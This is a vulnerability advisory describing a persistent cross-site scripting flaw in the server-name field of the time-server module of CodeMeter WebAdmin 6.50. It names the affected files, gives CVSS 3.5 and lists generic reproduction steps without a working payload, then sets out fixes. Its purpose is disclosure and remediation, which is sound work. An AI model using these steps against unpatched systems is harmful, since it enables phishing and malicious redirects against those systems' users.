Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A persistent input validation vulnerability has been discovered in the Wibu Systems AG CodeMeter WebAdmin v6.50 web-server web-application.
The vulnerability allows remote attackers to inject own malicious script code with application-side vector to the vulnerable function or
module to followup with a compromising attack.

The input validation vulnerability has been discovered in the `server name` input field of the `advanced settings - time server` module.
The request method to inject is POST and the attack vector is located on the application-side. First the attacker injects the payload and
after it the POST request is performed to save the content permanently. After that the issue triggers on each visit an execution. The basic
validation in the application is well setup but in case of the advanced settings the validation parameter are still not implemented to secure
the function at all. The vulnerability is a classic filter input validation vulnerability. The application has no cookies and therefore the
attack risk is more minor but not that less then to ignore it. The vulnerable files are `ChangeConfiguration.html`, `time_server_list.html`
and `certified_time.html`. The `ChangeConfiguration.html` is marked as injection point for the payload. The `time_server_list.html` and
`certified_time.html` files are mared with the execution point of the issue.

The security issue was uncovered during the blurrybox hacking contest of the wibu systems ag and acknowledged by the management.

The security risk of the persistent input validation issue is estimated as medium with a cvss (common vulnerability scoring system) count of 3.5.
Exploitation of the persistent input validation web vulnerability requires low user interaction and a privileged web-application user account.
Successful exploitation of the vulnerability results in persistent phishing attacks, persistent external redirects to malicious sources and
persistent manipulation of affected or connected application modules.


Request Method(s):
[+] POST

Vulnerable Module(s):
[+] Advanced Settings - Time Server

Vulnerable File(s):
[+] ChangeConfiguration.html

Vulnerable Parameter(s):
[+] server name

Affected Module(s):
[+] time_server_list.html
[+] certified_time.html


Proof of Concept (PoC):
=======================
The persistent input validation vulnerability can be exploited by remote attackers with privileged user account and with low user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


Manual steps to reproduce the vulnerability ...
1. Start the CodeMeter software
2. Open the webadmin gui
3. Move to advanced settings
4. Open the time-server module
5. Click the plus to add a new time server
Note: The request method is POST
6. Inject a test script code payload with matching domain and save via POST
7. The code is saved and executes of the dbms in the time-server list module index
8. Successful reproduce of the vulnerability!

Note: The method can be automated by usage of post method requester to include a payload.

Solution - Fix & Patch:
=======================
1. Restrict the input field and disallow the usage of special chars like in the other input fields
2. Parse the input field and escape the content
3. Parse in the visible listing the output location of the item
4. Setup a secure exception-handling to handl illegal events
5. Include a proper validation mask to the form to prevent further injection attacks

The security vulnerability has been patched in the version 6.50b.


Security Risk:
==============
The seurity risk of the persistent input validation web vulnerability in the web-server webadmin web-application is estimated as medium (CVSS 3.5).
Earlier version releases up to codemeter 6.50 may be affected as well by the cross site scripting web vulnerability.
